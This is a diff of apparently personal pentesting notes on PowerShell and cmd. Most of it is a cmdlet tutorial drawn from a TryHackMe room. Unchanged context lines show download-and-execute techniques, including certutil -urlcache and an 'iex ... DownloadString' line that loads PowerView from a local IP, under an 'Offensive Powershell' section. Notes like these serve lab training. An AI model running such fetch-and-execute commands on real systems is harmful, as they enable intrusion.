@@ -1,8 +1,52 @@
 # Useful commands with Powershell, cmd and Sysinternals
 
-## Powershell
+## Powershell Overview
 
-### Downloading files
+- Cmdlet format: `Verb-Noun`  the output of these cmdlets are objects
+- Commom verbs: `Get`, `Start`, `Stop`, `Read`, `Write`, `New`, `Out`.
+- `Get-Command` to list all commands
+  - `Get-Command Verb-*` or `Get-Command *-Noun` to filter the command
+- `Get-Help Command-Name` will output help on a command.
+
+### Object manipulation
+
+- `|` Pass output from one cmdlet to another
+- An object will contain methods and properties. You can think of methods as functions that can be applied to output from the cmdlet and you can think of properties as variables in the output from a cmdlet
+- `Verb-Noun | Get-Member` output methods and properties of the cmdlet
+  - Example: `Get-Command | Get-Member -MemberType Method`  
+
+![Example](../.res/2022-08-02-11-40-37.png)
+
+- One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the Select-Object cmdlet.
+  - Example: `Get-ChildItem | Select-Object -Property Mode, Name` listing the directories and just selecting the mode and the name.  
+
+![Example](../.res/2022-08-02-11-42-40.png)
+
+#### Useful flags
+
+- first - gets the first x object
+- last - gets the last x object
+- unique - shows the unique objects
+- skip - skips x objects
+
+#### Filtering objects
+
+- `Verb-Noun | Where-Object -Property PropertyName -operator Value`
+- `Verb-Noun | Where-Object {$_.PropertyName -operator Value}` uses the $_ operator to iterate through every object passed to the Where-Object cmdlet.
+- Operators: `Contains` If any item in the property value is an exact match for the specified value/, `EQ` If the property value is the same as the specified value, `GT` If the property value is greater than the specified value
+- Full list of operators [here](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-6)
+- Example: `Get-Service | Where-Object -Property Status -eq Stopped` Checking the stopped processes
+
+![Example](../.res/2022-08-02-11-51-34.png)
+
+#### Sort objects
+
+- `Verb-Noun | Sort-Object`
+- Example: `Get-ChildItem | Sort-Object` sorting the list of directories
+
+Source: [TryHackMe - Throwback](https://tryhackme.com/room/throwback)
+
+## Downloading files
 
 - `certutil.exe -urlcache -f http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need name-you-want-to-give-the-file` (works also in cmd)
   ```
@@ -18,6 +62,17 @@
   ```
   PS C:\Users\s.chisholm.mayorsec\Desktop> iex (New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')
   ```
+
+## Offensive Powershell
+
+### Using modules
+
+- `Import-Module Module`
+- `. .\Module.ps1`
+
+### Enumeration
+
+- For manual enumeration with powershell check out my article [here](./manual-enum-ad.md)
 
 ### Powershell Remoting
 
@@ -47,9 +102,9 @@
 - `Get-LocalUser` check the description field of local users
 - `Get-WmiObject -Class Win32_OperatingSystem | select Description` Print computer description fields
 
-## CMD
+## DOS CMD
 
-### Downloading files
+## Downloading files
 
 - `certutil.exe -urlcache -f http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need name-you-want-to-give-the-file`
 - `curl.exe -o name-you-want-to-give-the-file http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need`
@@ -194,3 +249,4 @@ C:\Program Files\Windows PowerShell\*
 ## Resources
 
 {% embed url="https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/07-working-with-wmi?view=powershell-7.1" %} Working with wmic {% endembed %}  
+{% embed url="https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7" %} Approved verbs for Powershell {% endembed %}  
